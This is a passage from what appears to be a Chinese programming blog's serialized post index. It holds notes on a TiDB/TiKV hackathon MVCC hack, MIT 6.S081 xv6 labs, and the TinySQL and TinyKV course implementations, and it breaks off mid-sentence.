return err &#125; // construct the writeCF value // encoded value: OP _FLAG + START_TS + LONG_VALUE_SUFFIX + LONG_VALUE_LEN + VALUE // encoded value: []byte&#123;&#x27;P&#x27;(or &#x27;D&#x27;), VarU64(0)..., &#x27;V&#x27;, U32(len(value)))..., value...&#125; encodedValue := make([]byte, 7) encodedValue[0] = op encodedValue[1] = 0 encodedValue[2] = &#x27;V&#x27; binary.BigEndian.PutUint32(encodedValue[3:7], uint32(len(value))) encodedValue = append(encodedValue, value...) // Raw input addrs := []string&#123;&quot;127.0.0.1:2379&quot;&#125; // get pd addr if store, ok := sctx.GetStore().(interface&#123; EtcdAddrs() ([]string, error) &#125;); ok &#123; if addrs, err = store.EtcdAddrs(); err != nil &#123; return err &#125; &#125; cli, err := rawkv.NewClient(ctx, addrs, config.DefaultConfig().Security) if err != nil &#123; return err &#125; err = cli.PutWithCF(ctx, encodedKey, encodedValue, &quot;write&quot;) if err != nil &#123; return err &#125; // ...&#125; 这里还有一个比较 hack 的点是，我直接将一行的值存放到了 write 里（因为不太容易拿到 start_ts 没办法构造 default 的 Key，为了可以容纳更多的数据，我在 write 里多加了一个 long value（类似于以前的 short value），具体实现见 TiKV。 具体修改见：https://github.com/Long-Live-the-DoDo/tidb/pull/3 。 TiKV 侧实现TiKV 这边主要是依照 short value 给 write 增加了一个 long value。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748// components/txn_types/src/write.rs#[derive(PartialEq, Clone)]pub struct WriteRef&lt;&#x27;a&gt; &#123; pub write_type: WriteType, pub start_ts: TimeStamp, pub short_value: Option&lt;&amp;&#x27;a [u8]&gt;, pub long_value: Option&lt;&amp;&#x27;a [u8]&gt;, pub has_overlapped_rollback: bool, pub gc_fence: Option&lt;TimeStamp&gt;,&#125;impl WriteRef&lt;&#x27;_&gt; &#123; pub fn parse(mut b: &amp;[u8]) -&gt; Result&lt;WriteRef&lt;&#x27;_&gt;&gt; &#123; // ... while !b.is_empty() &#123; match b .read_u8() .map_err(|_| Error::from(ErrorInner::BadFormatWrite))? &#123; // ... LONG_VALUE_PREFIX =&gt; &#123; let len = b .read_u32() .map_err(|_| Error::from(ErrorInner::BadFormatWrite))?; if b.len() &lt; len as usize &#123; panic!( &quot;content len [&#123;&#125;] shorter than short value len [&#123;&#125;]&quot;, b.len(), len, ); &#125; long_value = Some(&amp;b[..len as usize]); b = &amp;b[len as usize..]; &#125; // ... &#125; &#125; Ok(WriteRef &#123; write_type, start_ts, short_value, long_value, has_overlapped_rollback, gc_fence, &#125;) &#125;&#125; 然后在 handle_write 中添加相应的读取 long value 的逻辑即可。 123456789101112131415161718192021222324252627282930fn handle_write( &amp;mut self, current_user_key: Key, commit_ts: TimeStamp, cfg: &amp;mut ScannerConfig&lt;S&gt;, cursors: &amp;mut Cursors&lt;S&gt;, statistics: &amp;mut Statistics,) -&gt; Result&lt;HandleRes&lt;Self::Output&gt;&gt; &#123; let (value, write_type): (Option&lt;Value&gt;, WriteType) = loop &#123; // ... match write_type &#123; WriteType::Put =&gt; &#123; if cfg.omit_value &#123; break (Some(vec![]), write_type); &#125; if let Some(value) = write.long_value &#123; break (Some(value.to_vec()), write_type); &#125; match write.short_value &#123; // ... &#125; &#125; WriteType::Delete =&gt; break (None, write_type), WriteType::Lock | WriteType::Rollback =&gt; &#123; // Continue iterate next `write`. &#125; &#125; &#125; // ...&#125; 具体修改见：https://github.com/Long-Live-the-DoDo/tikv/pull/4 。 执行效果 select update delete delete 后 update raw update 还可以继续完善的点 将 NeedMvcc 存放在 SessionContextVars 中并不优雅，最好放入查询计划的相应结构中。 delete from t where _tidb_mvcc_ts=xxx 这样的语句存在二义性，后续可能会做成删除对应的 MVCC 记录。 没有做 _tidb_mvcc_ts 与 _tidb_mvcc_op 相关的限制。例如，创建表时不允许以这两个名字命名、不允许修改这两列的值等。也可以做成，当修改这两列时直接进行 KV 更新操作（不过这种感觉没什么意义）。 在 TiKV 中只实现了 MVCC 的 ForwardScan 没有实现 BackwardScan，这可能造成某些使用了 BackwardScan 的语句的不兼容。 加入虚拟列的编码方式过于简单粗暴，可以考虑对其现阶段的 TiDB 适配所有编码方式。 只考虑了普通的 TableScan 操作，没有考虑 IndexScan。 这些操作只针对于单表单条语句，并不适用于多表与事务操作。 RawUpdate 操作不支持事务。 …… 后话在两位哥哥的带领下荣获三等奖。土豆哥的答辩片段：https://www.bilibili.com/video/BV1ZF411H73L","tags":["Hackthon","数据库"],"categories":["编程开发"]},{"title":"6.S081 笔记","path":"/6-s081-notes/","content":"记录一下学习 MIT 6.S081 与 xv6 book 时遇到的一些问题。 LEC 1: Introduction 为什么系统调用 exec 不直接和 fork 做成一块。因为要考虑到管道这种操作的情况，管道需要把前一个程序的标准输出定向到后一个程序的标准输入（使用 close、dup 等操作），由于子进程的文件描述符表和父进程独立，这样先 fork 再在子进程中 exec 就可以直接不用管后续了。如果做成了 forkexec 这种，如果遇到执行失败返回了原本的程序，需要再恢复文件描述符的对应，这样的操作比较繁琐，可扩展性差。 LEC 4: Page Table 在 RISC-V 中内存管理单元（MMU）并不会保存完整的页表，它会通过寄存器 SATP 找到当前运行的进程的页表，SATP 中存放的是页表在内存中的地址（实际物理地址），只有 SATP 设置了 RISC-V CPU 才会启用 MMU。当不同进程进行切换时，也会更新 SATP。 三级页表中的 PPN 都是实际的物理地址。 为什么硬件（RISC-V）实现了 MMU 的功能，我们还是要在内核代码中实现 walk 这样对虚拟内存翻译的功能？我的理解是，硬件自己实现的 MMU 可以帮助硬件在执行机器代码时可以通过 xv6 写入的页表进行映射，比如 C 语言代码编写的一些非系统调用的操作，比如 C 语言代码中的直接通过某地址访问内存，这个就是虚拟地址，而且就可以靠硬件自己的 MMU 了。而实现 walk 是因为内核需要实现页表的可编程，可以直接通过访问物理内存来实现一些操作（比如一些系统调用），比如直接从指定物理地址提取数据或向指定物理地址写入数据，要不然只能通过机器指令（汇编）获取物理内存中的内容。而且后续课程会提到的 Page Fault 等操作也需要靠这样可编程的页表来操作。另外值得提的一点是，内核在初始化时会将自己的页表构造为和物理地址一对一的映射（direct-mapping），所以内核程序执行时访问的内存地址就是实际的物理地址。 LEC 6: Isolation &amp; system call entry/exit 这一章主要就是程序陷入 trap 的整个过程。以系统调用为例。系统调用都是通过 ecall 这个 RISC 指令进入，ecall 会触发一种 trap，并会设置好 STVEC （也就中断向量）、SEPC 等寄存器。在 xv6 里中断向量会指向 trampoline.S 的 uservec 函数，这里会进行一波 trap 之前的处理。然后接下来就是 uservec -&gt; usertrap -&gt; usertrapret -&gt; userret，从进入中断向量，到中断处理，再到返回用户代码。中断处理的逻辑都在 usertrap，在后续的 lab 中基本都是在这里面进行操作。 LEC 8: Page faults 这一章的内容相对简单，主要是讲了现代操作系统利用 page fault 可以做一些什么样的操作。基本都是利用 page fault 做一些内存相关的 lazy 的操作。也就是对于内存的分配，不是一开始就分配好的，而是通过 page fault 的触发来现分配内存，这样可以节约创建进程的开销（但是会带来对内存页写的开销）。主要思想就是，分配了内存地址范围之后，并不分配实际内存，当访存失败触发 page fault 时再分配内存。COW fork，demand paging 等都依靠这种方式实现。 在 COW 的 Lab 中有一些小细节需要注意，这个地方害得我 cowtest 中的 file 一直遇到问题（见下面代码块）。还有一个小的注意点是，在 copyonwrite 中，内存页 copy 之后需要对原物理地址页调用一次 kfree 来减去引用计数（或者单独写一个函数来控制引用计数，我这里是融合到了其他函数中），不然会出现内存未被正确清除干净的问题。 123456789101112131415161718192021222324252627282930313233intcopyout(pagetable_t pagetable, uint64 dstva, char *src, uint64 len)&#123; uint64 n, va0, pa0; while(len &gt; 0)&#123; va0 = PGROUNDDOWN(dstva); pa0 = walkaddr(pagetable, va0); if(pa0 == 0) return -1; // 这里不能直接使用 PA2PTE(pa0), // 因为这样 pte 不带标志位，必须要重新 walk pte_t* pte = walk(pagetable, va0, 0); if (*pte &amp; PTE_COW) &#123; if (copyonwrite(pagetable, va0) != 0) &#123; return -1; &#125; // 这里也必须重新 walk，因为 copyonwrite 中可能重新分配了地址 pa0 = walkaddr(pagetable, va0); &#125; n = PGSIZE - (dstva - va0); if(n &gt; len) n = len; memmove((void *)(pa0 + (dstva - va0)), src, n); len -= n; src += n; dstva = va0 + PGSIZE; &#125; return 0;&#125; LEC 11: Thread switching 做 lab 的时候有一个问题稍微困扰了一下我。在 thread_create 的时候使用 t-&gt;ra = (uint64) func 将线程中要运行的函数的地址保存在了 t-&gt;ra 中，这样在 thread_switch 结束的时候我可以返回到正确的位置。我的疑惑在于要怎么保存线程运行到的地方呢，比如 thread_a 执行到某一个行的时候进行了 yield 让出了 CPU，那回到 thread_a 后要怎么回到 yield 的位置呢，因为 pc 并没有保存，ra 中存的又是 func 的初始位置，这岂不是每次都回 thread_a 的时候都要从 func 的一开始执行？这里其实是我想错了，因为 ra 并不是一成不变的，当执行 yield 等函数的时候，会在线程的栈中（也就是 t-&gt;stack 中）记录好各种信息，退出函数的时候会从 t-&gt;stack 中拿到返回地址等信息，返回地址会被打入 ra 中。所以以 thread_a 为例，在下一次 thread_switch 的时候，存到 thread_a 上下文信息中的 ra 已经不是最开始的 func 的地址了，而是执行 thread_switch 时的 ra。进程切换、线程切换就这里比较绕，必须以汇编的思维来思考每一个函数、每一个指令的执行逻辑，必要时可以以 gdb 为辅助一步一步观察来理解整个过程。 lab 的 Using threads 部分有一个小点，就是用一个全局大锁锁住所有操作没法通过 ph_fast 测试，优化方法为给每一个 bucket 一个锁，分别锁自己的，这样才能通过 ph_fast 测试。 LEC 16: File system performance and fast crash recovery ext3 的 logging system 与 xv6 的最大区别在于，xv6 的 transaction 是同步的，必须等头一个 transaction 的所有流程结束之后才能开始下一个；而 ext3 中，可以同时存在多个 transaction，但是下一个 transaction 也必须上一个 transaction 中的所有系统调用结束之后才能 open，在这之后两个 transaction 的不同状态可以共存（比如一个正在 commit，一个正在加入系统调用）。ext3 为 logging 提供了异步的解决方案，一个 transaction 中可以容纳更多的操作，提高并发度。 按照课中的说法，ext3 是每 5 秒开始一个新的 transaction。每一个系统调用会通过 start 获取一个 handle，然后在进行写操作时带上 handle 作为参数，这样可以让内核记录下这个 handle（代表本次系统调用） 属于哪个 transaction。 transaction 的 commit 会有专门的内核线程来执行，也就是说是和其他操作是并发执行的（类似于 GC）。","tags":["操作系统 - C - 公开课"],"categories":["课程学习"]},{"title":"TinySQL 实现笔记","path":"/tinysql-notes/","content":"原项目：https://github.com/tidb-incubator/tinysql 我的实现：https://github.com/RinChanNOWWW/tinysql-impl TInyKV 之外的另一个 PingCAP incubator 的项目，实现一个微型 TiDB，即 TinySQL。正好十月中旬要参加 OB 的比赛，做这个刚好可以了解了解数据库 SQL 层的一些东西，这些在 CMU 15-445 的实验中没怎么深入。虽然 TiDB 的存储层是 KV 的形式，但是总体上的思想应该都大同小异。与之前 TinyKV 一样，这个文章用来做个笔记。 Project 1将行记录与索引（实际上是 KV）中的 Key 解码，得到行以及索引的相关信息：table id，row id，index id，index col value 等。没什么好说的。就是代码骨架中有很多现成的函数，比如自己从切片中一个一个的取。 Project 2本节利用 yacc 来进行 SQL 语法的补充，此 Project 中补充的是 Join 的语法，针对测试用例中的 join, left join, right join, join on 编写 yacc 文件即可。由于学编译原理时接触过这些所以很快就能上手，而且不会的话还可以看 TiDB parser 的源码不是（ Project 3本节实现了 SQL DDL 中删除一列的操作，具体来说是实现 F1 Schema 变更算法，具体参考这篇文章，这篇文章的例子是添加索引，这里需要实现删除列，所以状态的变更是反着的，应该为： 1public --&gt; write-only --&gt; delete-only --&gt; (reorg) --&gt; absent 在 public --&gt; write-only 阶段进行 adjustColumnInfoInDropColumn，因为这之后要被删除的 Col 已经不可被读了。 Project 4Part 1本部分主要是对 Cascades Planner 进行实现，主要是体验一下实现 OnTransform 与 PredicatePushDown 这两个方法。 OnTransform这个方法是为了探索所有可能的 SQL plan，来对 Memo Group 这个树形结构进行变换，来寻找更优的执行方案。在这层逻辑中，我们只需要考虑具体变换的内容即可，不用考虑上层的各种判断条件。 PushSelDownAggregation：这里要实现从 sel-&gt;agg-&gt;x 到 agg-&gt;sel-&gt;x 或者 sel-&gt;agg-&gt;sel-&gt;x 的变换。当 sel 中的条件都存在于 agg 中就可以完全下推到 agg 之后（前者），否则就是后者。具体体现是判断 sel 中每一个 condition 的列是否存在于 agg 的 group by 的列当中，并做下记录。存在的列可以下推到 agg 之下，剩余的保留在原位置。 MergeAggregationProjection：这里要实现从 agg-&gt;projection-&gt;x 到 agg-&gt;x 的变换。也就是把映射合入 agg 中，只保留需要的列。我们只需要将 agg 中的 group by 的列与 aggregation function 的参数进行映射变换即可，然后消除 projection 这一层 Group。 PredicatePushDown这个方法为实际的逻辑计划实现谓词下推。这里实现了 LogicalAggregation 的谓词下推。这里的实现有点像上面 OnTransform 两个部分的结合。先通过 group by 的列找到可以下推的 condtion，然后保留其中有用的列，最后将选出来的谓词下推即可。 Part 2Count-Min Sketch实现 CM Sketch 算法，包括新增 value 以及查询 value。其中每一行的 Hash 算法（查看 TiDB 源码得知）为： 1234h1, h2 := murmur3.Sum128(bytes)for i := range c.table &#123; j := (h1 + h2*uint64(i)) % uint64(c.width) // hash&#125; 新增 value 较为简单，算出 Hash 之后再将 table 中对应位置的 count 增加即可。查询按照文章 https://pingcap.com/zh/blog/tidb-source-code-reading-12 的说法，TiDB 使用了 Count-Mean-Min Sketch 算法，引入了一个噪声值 (N - CM[i, j]) / (w-1) (N 为总数，w 为 table 宽度)，然后取所有行的值减去噪音之后的估计值的中位数作为最后的估计值。 Join Reorder本节实现了用动态规划算法找出最优 join 顺序。整体流程并没有想象中的那么简单。下面总结一下算法流程： 以邻接矩阵的方式建立 Join 图。 记录下表示相等的边与不是表示相等的边。 从一个没有访问的点开始进行广度优先遍历，得到一个连通的 Join 节点序列。 对于这些节点的 cost，进行动态规划算法得出最少 cost 的 Join 方案。 如果有还有没有访问节点则回到 3。 将收集到的所有 Join 方案结合到一起作为结果。 本流程的复杂并不在于算法的实现，而在于各种信息的收集： 需要收集用于 Join 的相等边，即 []joinGroupEqEdge，这个是用来存放 Join 中覆盖的边，在动态规划算法中即会使用。 不是表示相等条件的边，即 []joinGroupNonEqEdge，这个用来存放与 Join 无关的边，需要保留这个信息传递给后续调用链。 Access Path Selection本节实现 Skyline Prune 启发式算法来排除效果一定更差的路径，重点在于实现 compareCandidates 函数。根据注释来实现： 比较两个 candidate 的 col，覆盖范围更大的 candidate 更优。 比较两个 candidate 是否 match physical property，match 的那个更优。 比较两个 candidate 是否只需要扫面一次，只扫描一次的那个更优。 最后综合以上三种情况，如果 x 在所有方面都不弱于 y，且有一点优于 y，则选 x，反之亦然。 Project 5这里有一个不是代码实现上的坑点，那就是 Part1、Part2 需要通过的测试都需要完成 3 个 Part 之后才能成功。因为这些单测中都存在 join 语句与聚合函数，需要分别完成 Part2 和 Part3 才行，如果没有看单测内容不容易发现问题所在…… Part 1向量化字符串长度方法参考其他函数向量化方法编写，先获取数据，再编写主要逻辑： 1234567for i := 0; i &lt; n; i++ &#123; if buf.IsNull(i) &#123; i64s[i] = 0 &#125; else &#123; i64s[i] = int64(len(buf.GetBytes(i))) &#125;&#125; 为 SelectionExec 实现 Next 方法这里主要是指实现向量化的 Next。整体逻辑可以参考 unBatchedNext 方法，区别在于每次都是向量化批量处理，也就是说，和传统的 Volcano 模型的一次取一行相比，这里会通过一个 selected 数组一次取一批数据。这个 selected 数组通过调用 VectorizedFilter 即可从 children 中拿到。理解 Next 的关键就是当前 Executor 节点的 input 是通过其 children 的 Next 拿到，向量化的作用则是每次是拿一批数据而不单单只是一行。 Part 2实现并行 Hash Join 算法。 fetchAndBuildHashTable这个不涉及并行（并发）所以比较好想。就是首先调用 newHashRowContainer 生成一个新的 hash table，然后通过循环调用 Next 从 inner table 中获取数据（chunk），再将数据放入 hash table，直至没有更多数据即可。 主要逻辑： 1234567891011121314e.rowContainer = newHashRowContainer(e.ctx, int(e.innerSideEstCount), hCtx, initList)for &#123; chk := chunk.NewChunkWithCapacity(allTypes, e.ctx.GetSessionVars().MaxChunkSize) err := Next(ctx, e.innerSideExec, chk) if err != nil &#123; return err &#125; if chk.NumRows() == 0 &#123; return nil &#125; if err = e.rowContainer.PutChunk(chk); err != nil &#123; return err &#125;&#125; runJoinWorker负责拿取 outer table 的数据并 probe inner table 建立的 hash 表进行 join 操作，并返回交过到 main thread，以下是几个主要需要用的 channel 变量及其用法： closeCh：用于结束 loop 的通道。 outerResultChs[workerID]：outer fetcher 通过此通道来向 join worker 分发任务。 outerChkResourceCh：用于返回本 worker 接收任务用的通道以及本 worker 用的 chunk，循环利用 chunk，避免重新分配内存。 joinChkResourceCh：outer table 的数据收集完毕后，通过此通道返回 hash join 的结果。 主要逻辑： 1234567891011121314151617181920ok, joinResult := e.getNewJoinResult(workerID)if !ok &#123; return&#125;for ok := true; ok; &#123; select &#123; case &lt;-e.closeCh: return case outerResult, ok = &lt;-e.outerResultChs[workerID]: &#125; if !ok &#123; break &#125; // 实际利用 hash table 进行 join ok, joinResult = e.join2Chunk(workerID, outerResult, hCtx, joinResult, selected) // ...&#125;// ...// 返回数据，需要有判空以及判错等逻辑e.joinChkResourceCh[workerID] &lt;- joinResult.chk Part 3和上面的 Hash Join 类似，实现 Hash Aggregate。整体上的思路和 MapReduce 差不多，就是将整个计算任务分开，并分配给多个 PartialWorker，然后按照 Key 预聚合，再Shuffle 给不同的 FinalWorker 进行 Value 的聚合，最后再返回给 Main 组合成最终结果。与 MapReduce 的进程级通信不同，这里 worker 之间通过 channel 传递数据。 shuffleIntermData使用 Hash 算法算出某个 Key 应该发给哪个 final worker，然后通过 channel 将这些 Key 发给那个 worker 即可。 consumeIntermData通过 channel 拿到数据，再将数据聚合到对应的 Key 的位置即可。 这里有一个小问题，就是在 executor/aggregate_test.go 的 TestAggPushDown 中第 4 条语句 tk.MustExec(&quot;alter table t add index idx(a, b, c)&quot;) （executor/aggregate_test.go: 56）会一直执行不出来，注释掉这一句即可 pass。在我写的全部代码中应该没有涉及索引 DDL 语句的修改，不知道是不是我的问题，也不好意思轻易地提 Issue。 参考 https://github.com/pingcap/parser (Project 2) https://github.com/ngaut/builddatabase/blob/master/f1/schema-change.md (Project 3) https://pingcap.com/zh/blog/tidb-cascades-planner (Project 4 Part 1) https://pingcap.com/zh/blog/tidb-source-code-reading-12 （Project 4 Part 2） https://github.com/pingcap/tidb (Project 3, Project 4, Project 5)","tags":["个人项目"],"categories":["编程开发"]},{"title":"TinyKV 实现笔记","path":"/tinykv-notes/","content":"原项目：https://github.com/tidb-incubator/tinykv 我的实现：https://github.com/RinChanNOWWW/tinykv-impl PingCAP incubator 的项目，实现一个微型 TiKV（以及 PD）。在此文章中记录一下开发中的值得注意的点。 最后更新：2022-06-16 Project 1基于 badger 实现一个单机存储引擎，没什么好说的。 Project 2实现 Raft 以及基于 Raft 的 KV server。之前在 MIT 6.824 课程学习的时候，也使用 Go 作为编程语言完成了其实现 Raft 算法的课程实验，不过当时因为是第一次接触，所以代码写的很杂乱，鲁棒性也很低。这次重新实现，借助于非常详实的 test case，写起来也更加顺畅，代码架构也比之前写的清晰了许多，虽然到后面也开始变得杂乱无章了起来。 Part A在本部分主要是实现了 Raft 算法本身以及暴露给外部的接口层 rawnode。 关于 Raft 日志的保存在实现过程中，值得注意的是，TinyKV 的 Raft 层中 log 存在于两个部分，一个是内存中的 RaftLog.entries，一个是实际落盘的 RaftLog.storage。一开始我被这两个东西搞得晕头转向，其实一开始就该明确，前者是算法运行过程中实际活跃的 log，而后者是被applied 的 stable 数据。所以 Raft 算法运行过程中所有的日志都应该从 RaftLog.entries 中存取。只不过由于 RaftLog.entries 可能会被清理（被压缩，或者重启 server 等），所以它的第一条日志所对应的 index 可能不是实际的第一个 index，所以需要结合 RaftLog.storage.FirstIndex 来换算。 关于日志同步日志同步是通过 Leader 调用 sendAppend 来向 Follower 批量发送未同步的日志。这里需要注意的是更新 commit 值的时机，除了收到 AppendResponse 外，在成为 Leader 之后也需要立即 check 一遍，因为集群中可能只有 Leader 一个 Node 存在。 关于状态信息的恢复还有一个值得注意的地方就是，在调用 newRaft 的时候需要先从 config.storage 中恢复一些落盘的状态信息：Term, Vote, Commit 以及整个集群的节点配置信息。如果忽略这一点会导致一些 test case 失败。 Part B这一个部分可以所示驱动整个 RaftStore 的中枢，是 Project 3 的基础。 这一部分的实现一开始完全没有头绪，所以很大程度上参考了 https://github.com/platoneko/tinykv 的实现。这一部分主要实现的是如何将 Raft 协议同步的日志 apply 到 upper application 中，也就是如何将 Raft 日志中记录的 KV 操作应用到实际的存储引擎中。 主要的步骤就是： 集群接收到 KV 操作，并交给 Leader 节点。 peerMsgHandler.proposeRaftCommand：Leader 节点将 KV 操作转换为 Raft 日志，再 propose 到 Raft 流程中。 peerMsgHandler.HandleRaftReady：每个节点都通过 rawnode 中定义的 Ready 接口拿到此时自己节点的状态与日志信息，并将其应用到实际的存储中（SaveReady)。最后更新 stable 与 applied 信息（Advance）。除了 Raft 集群的状态信息外，每次会将节点当前的所有未落盘的 log（Ready.Entries）与未落盘的快照（Ready.Snapshot）持久化，然后向各节点发送 Raft 信息（Ready.Messages），然后依次处理没有处理的 proposals（proposals 与 Ready.CommitedEntries 一一对应，Ready.CommitedEntries 为当前节点 commit 了但是没有 apply 到状态机的 log）。 应用完日志之后还需向客户端返回响应，实现中体现为给 proposal 的回调字段添加返回信息，并通知 channel。 这里面一开始困扰我的就是不知道整个集群是如何应用 Raft 日志的，其实十分简单，就是每个节点都会持续运行一个 worker 来检查 Raft 层的状态，如果能够进行处理那就进行处理，不行就等待下一次循环。在这之中需要注意的是对 snapshot 的特殊处理。 Part C在 Raft 中，snapshot 是为了处理这样一种情况：leader 前面有一部分 log 已经落盘且通过 GC 进行了压缩清理（假设 index = a 及之前的 log 已经被 GC），然而存在 follower 没有 index = a 之前的 log，需要由 leader 通过 append 操作补全。这种情况下， leader 已经无法取得 index = a 以及之前的 log 了，也就无法将这些 log 发送给 follower，这时就需要通过 snapshot 解决。snapshot 是从状态机中取出，所以肯定是共识后后数据，可以直接被 apply 到 follower 的状态机中。 在实现上，当 follower 收到 snapshot 的 log 时，会先把它保存在 Raft.pendingSnapshot 中，当这条 snapshot log 被 commit 了，然后上层要对其进行应用时，会将此 pendingSnapshot 取出（通过 Ready），然后应用到状态机中（进行落盘）。 对 snapshot 进行提取、落盘的操作 TinyKV 框架已经提供了相关接口，不用自己实现，需要实现的就只有添加发送 snapshot 、接受 snapshot 以及应用 snapshot 的逻辑，以及完善之前代码中需要 check snapshot 的部分。这部分的操作和 Part B 中的其他操作是一样的。 Project 3这部分会实现 TiKV 的多 Region 多 Raft Group 机制。 Part A此部分依靠 Raft extend 论文的 Section 6 以及 https://web.stanford.edu/~ouster/cgi-bin/papers/OngaroPhD.pdf 的 Section 3.10 实现了 Raft 层面的 Leader Transfer 以及节点配置的变化（也就是 Raft 集群的成员变更）。其中对于成员变更的细节主要参考了原论文以及 https://zhuanlan.zhihu.com/p/375059508 这篇文章的解读。后者是前者的翻译 + 更加平实的语言的分析。 本部分实现起来较为简单，主要是复习了一遍 Raft 的成员变更策略，之前面试问到都没想起来……之前读论文的时候这后面的部分读的太水了…… Part B关于 Leader 与成员变更此部分依照 Project 2 Part B 的结构添加了针对 Leader Transfer 和 Conf Change 两种消息的处理，实现起来相对较为简单。需要注意的就是记得更新 storeMeta 里的信息。 做这个 part 的时候因为一个坑点调试了好几个小时。就是 Conf Change 中 AddNode 之后，集群的信息（raft.Prs 等）不会立刻同步到新的节点上，NewPeer 这个方法并不会初始化 peers 这个属性，这会导致下面这段代码直接返回，不进入 step 处理： 1234567891011121314151617// raft/raft.gofunc (r *Raft) Step(m pb.Message) error &#123; // Your Code Here (2A). if _, ok := r.Prs[r.id]; !ok &#123; // 会直接返回 return nil &#125; switch r.State &#123; case StateFollower: return r.stepFollower(m) case StateCandidate: return r.stepCandidate(m) case StateLeader: return r.stepLeader(m) &#125; return nil&#125; 从而导致新增加的节点无法处理心跳而超时进行选举，又由于双节点情况下成为 candidate 会立刻成为 leader，这不仅会造成脑裂，而且会导致新节点成为 leader 后进行 append entries 操作更新自己节点的 raft.Prs 出错（在我的设计中，每一个节点，包括自己都会存在 raft.Prs 中，当然如果不这样设计就不会出现这样的问题），因为 raft.Prs 是空的，对其访问会引发访存错误。新节点中的集群信息需要等待当前 leader 发送 snapshot 进行更新。 解决这个问题有很多种方法，比如可以优化上面的这个 Step 方法，做特殊判断。我的解决办法是在 newRaft 的时候必初始化 raft.Prs，为其添加一条针对本节点的记录。 对于此 part 的 test case，都能通过，但是有些有时会超时，也不知道是不是代码的问题，这还需要后续排查。 2022-06-16 Update: 超时问题和 WMC 同学进行了一波讨论，他解决了这个问题，详见他的博客 https://www.wmc1999.top/posts/tinykv-impl/#part-b-1 。 关于 Region 分裂这个其实很好实现，还是在之前的框架之下，对 raft_cmdpb.AdminCmdType_Split 信息进行处理即可。整个过程就是： 判断当前 region epoch 是否合法。 判断 split key 是否在当前 region 中。 更新 store meta，从 d.ctx.storeMeta.regionRanges 中删除老 region。 生成新 region，及其 peers。新 region 范围是 [split key, 老 region.EndKey)，更新老 region 的 end key 为 split key，并将更新 d.ctx.storeMeta.regionRanges 与 d.ctx.storeMeta.regions。并写入实际存储层。 Part C这部分相当于实现一个小型的 pd，实现了其中收集心跳与集群平衡调度两个小功能，整体实现起来较为简单，只需要按照文档中的步骤一步一步实现即可（不过首先是要读懂）。 不过值得注意是选中要迁移的 region 所在的 store 数需要满足 cluster 的 max replicas。 1234storeIds := suitableRegion.GetStoreIds()if len(storeIds) &lt; cluster.GetMaxReplicas() &#123; return nil&#125; Project 4本 Project 目的是实现分布式事务。TiDB 的分布式事务模型采用的 Google 的 Percolator 模型，所以实现本节的关键就是理解 Percolator 的思想。 我主要是参考原论文：https://www.usenix.org/legacy/events/osdi10/tech/full_papers/Peng.pdf ，以及这篇解析：http://mysql.taobao.org/monthly/2018/11/02/ 。 Part A这部分实现了事务的基础，也就是实现原论文中对于某一个数据对象 data、lock、write 三列的读写。总体实现上较为简单，我借助了原论文的 Figure 4 来加以理解。接下来就是了解 TinyKV 给我提供的一些 tool 函数与访存接口进行 KV 的读写即可。 另外一个要注意的就是用完 Iter 之后记得把迭代器 close 了。4B 会做这个的检测，要不然会 fail（可真安全啊）。 Part BPart B 在 Part A 实现的 MVCC Transaction 的基础上实现了 get，prewrite 与 commit 这三个操作的逻辑。逻辑清晰简单，下面记录一下主要的逻辑。 KvGet 检查是否有当前 Version 之前的 lock，如果有则无法拿到 value，返回 key is locked。 KvPrewrite对于每一个 key 的 prewrite： 检查是否有当前 start_ts 之后最近的一次 write，如果有，则 prewrite 失败，记录当前 key conflict。 检查是否有非当前 Version 的 lock，如果有，则 prewrite 失败，记录当前 key is locked。 若上述都成功，则写入 data（在 TinyKV 中为 default 列族），并 lock。 KvCommitcommit 的所有操作都在对 key 的 latch 下进行。 对于每一个 key 的 commit： 检查当前 key 是否有 lock，如果没有，commit 失败直接返回。 检查当前 key 的 lock 是否属于当前事务，如果不是，commit 返回 retryable。 若上述都成功，则写入 write，并移除 lock。 Part C 此部分实现四个方法： KvScan：用于按 Key 顺序扫描。 KvCheckTxnStatus：用于检查事务锁的状态。 KvBatchRollback：用于批量回滚数据。 KvResolveLock：用于解决锁的问题。 这部分的实现其实较为容易，按照注释里给的步骤一步一步实现即可，只有 KvScan 需要稍微自己想想。 KvScan这部分首先要实现 Scanner 这个 struct，相当于是自己封装了一个迭代器，来顺序迭代基于 MVCC 的 key。 根据我之前各种迭代器的了解，最重要的就是需要在迭代器类中记录一个 next 值，用来指向当前需要访问的值，并在得到值之后进行更新，更新为想实现的顺序逻辑的下一个记录；如果 next 值为空，则代表迭代结束。所以整个 Scanner 的实现就秉承上面的思想就可以了。 首先是当前有效值的查找。TinyKV 中 KV 值的顺序为 (userkey 升序，ts 倒序)，也就是排除 ts 不看的话，是按 userkey 升序排列，在每一个 key 的部分中，按 ts 倒叙排列，越新的在越前面。举个例子，如果整个 key 为 {userkey_ts}，那么会有如下顺序（从左到右为递增）：1_10, 1_5, 1_1, 2_4, 2_1, 3_20, 3_15, 3_5……在这样的顺序的基础上，需要找到最接近且大于 {next_start} 的值（next 为要找的值，start 为事务的 start_ts）： 1234567891011scan.iter.Seek(EncodeKey(key, scan.txn.StartTS))item := scan.iter.Item()currentUserkey := DecodeUserKey(item.Key())currentTs := decodeTimestamp(item.Key())// 需要找到满足 ts &gt; txn.StarTS 的for scan.iter.Valid() &amp;&amp; currentTs &gt; scan.txn.StartTS &#123; scan.iter.Seek(EncodeKey(currentUserkey, scan.txn.StartTS)) item = scan.iter.Item() currentTs = decodeTimestamp(item.Key()) currentUserkey = DecodeUserKey(item.Key())&#125; 然后就是下一个 next 值得查找。这个就比较简单，只需要顺序查找到第一个和当前 key 不一样的即可： 1234567for ; scan.iter.Valid(); scan.iter.Next() &#123; nextUserKey := DecodeUserKey(scan.iter.Item().Key()) if !bytes.Equal(nextUserKey, currentUserkey) &#123; scan.next = nextUserKey break &#125;&#125; 实现了 Scanner 之后 KvScan 就没什么难的了。就在使用 Scanner 一个一个读的基础上，执行和先前 KvGet 一样的逻辑即可。 KvCheckTxnStatus此方法是用来检查当前事务的状态。这一部分注释里把步骤写得很清楚了： 先看是否有 write （commit 或 rollback），如果有则放回相应的信息。 如果没有 write 则看 lock，如果没有 lock 则进行 rollback，并返回相应信息。 最后查看 lock 是否已经过期了，如果过期了则进行 rollback，并返回相应信息。 如果一切正常，则返回锁的 ttl。 KvBatchRollback这个方法对请求里的 key 一一进行 rollback。主要注意以下几点： 如果此 key 在当前事务中已经 write，则直接 abort，除非 write 类型是 